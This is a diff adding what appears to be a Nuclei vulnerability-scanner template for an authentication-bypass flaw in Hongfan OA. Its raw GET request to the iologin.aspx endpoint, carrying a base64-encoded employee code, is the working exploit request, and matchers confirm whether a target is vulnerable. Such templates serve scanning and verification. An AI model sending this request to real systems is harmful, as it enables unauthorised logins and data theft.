@@ -1,0 +1,28 @@
+id: hongfan-oa-user-login-bypass
+
+info:
+  name: "红帆OA身份验证流程缺陷导致任意用户凭证登录"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    红帆OA系统存在身份验证流程设计缺陷，攻击者可通过构造特制请求绕过多因素认证验证机制，实现非授权用户凭证登录操作。
+      该漏洞允许远程攻击者在未提供有效身份凭证的情况下访问受限系统功能，可能造成用户敏感信息泄露及系统控制权丧失。
+  tags: 红帆
+
+http:
+- raw:
+  - |
+    GET /iOffice/prg/interface/iologin.aspx?iempcode=SENHRkU=&reurl=1 HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'HCGFE'
+  - type: word
+    part: body
+    words:
+    - '找不到对应的人员'
